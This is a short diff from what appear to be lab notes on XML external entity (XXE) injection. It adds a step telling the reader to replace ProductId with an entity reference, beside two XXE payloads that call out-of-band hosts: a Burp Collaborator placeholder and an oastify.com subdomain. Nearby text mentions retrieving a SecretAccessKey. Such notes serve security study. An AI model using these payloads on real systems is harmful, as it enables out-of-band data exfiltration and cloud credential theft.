@@ -25,7 +25,9 @@ This should return JSON containing the SecretAccessKey.
 
 ```
 <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
-
++ replace ProductId with: &xxe;
+```
+```
 <!DOCTYPE stockcheck [<!ENTITY % h1z54 SYSTEM "http://5lrwsx6c6dlkgmtrewokp6zxooufic61.oastify.com">%h1z54; ]>
 ```
 
